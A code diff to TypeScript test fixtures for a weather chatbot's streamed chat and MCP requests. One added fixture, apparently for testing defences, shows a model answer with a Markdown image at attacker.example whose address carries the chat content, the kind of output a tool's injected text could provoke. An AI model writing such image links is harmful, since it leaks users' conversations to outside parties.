@@ -87,6 +87,8 @@ const METADATA: MessageMetadata = { createdAt: CREATED_AT };
 // The same answer through MCP · no auth: each call a JSON-RPC tools/call to our MCP server, as AI SDK's MCP client
 // sends it (MCP 2026-07-28), recorded by the lane.
 export const MCP_URL = "https://weather-chatbot-hazel.vercel.app/api/mcp";
+// The chat request's id, which the lane sends with each request (Vercel's own id for the request, in its shape).
+const REQUEST_ID = "iad1::iad1::abcde-1730211234567-f3c2b1a0d9e8";
 
 /** A tools/call to our MCP server, as the MCP lane records it. */
 function toMcpWire(tool: string, input: unknown, id: number): WireRequest {
@@ -100,6 +102,7 @@ function toMcpWire(tool: string, input: unknown, id: number): WireRequest {
       "mcp-name": tool,
       "mcp-protocol-version": "2026-07-28",
       "user-agent": "ai-sdk/2.0.86 node.js/22",
+      "x-request-id": REQUEST_ID,
     },
     body: JSON.stringify({ method: "tools/call", params: { name: tool, arguments: input }, jsonrpc: "2.0", id }),
   };
@@ -159,6 +162,23 @@ const CUT_SHORT_CHUNKS: UIMessageChunk[] = [
   { type: "abort", reason: "TimeoutError: First chunk timeout of 10000ms exceeded" },
 ];
 
+// An answer whose Markdown has an image and a link, as a tool's text could get the model to write: an image is fetched
+// as soon as it's shown, carrying whatever its address holds.
+export const LEAK_IMAGE_URL = "https://attacker.example/pixel.png?chat=what-you-asked";
+const MARKDOWN_CHUNKS: UIMessageChunk[] = [
+  { type: "start", messageId: "answer-3", messageMetadata: METADATA },
+  { type: "start-step" },
+  { type: "text-start", id: "text-1" },
+  {
+    type: "text-delta",
+    id: "text-1",
+    delta: `Sunny in Paris. ![map](${LEAK_IMAGE_URL}) More at [Open-Meteo](https://open-meteo.com/).`,
+  },
+  { type: "text-end", id: "text-1" },
+  { type: "finish-step" },
+  { type: "finish", messageMetadata: METADATA },
+];
+
 /** Chunks as an HTTP response body: one `data:` line per chunk, then `[DONE]`. */
 function toStreamBody(chunks: readonly UIMessageChunk[]): string {
   return `${chunks.map((chunk) => `data: ${JSON.stringify(chunk)}\n\n`).join("")}data: [DONE]\n\n`;
@@ -176,6 +196,7 @@ const MCP_PARIS_CHUNKS: UIMessageChunk[] = PARIS_CHUNKS.map((chunk) => {
 export const PARIS_STREAM_BODY = toStreamBody(PARIS_CHUNKS);
 export const MCP_PARIS_STREAM_BODY = toStreamBody(MCP_PARIS_CHUNKS);
 export const CUT_SHORT_STREAM_BODY = toStreamBody(CUT_SHORT_CHUNKS);
+export const MARKDOWN_STREAM_BODY = toStreamBody(MARKDOWN_CHUNKS);
 
 /** The headers /api/chat sends with a stream. */
 export const STREAM_HEADERS = { "content-type": "text/event-stream", "x-vercel-ai-ui-message-stream": "v1" };
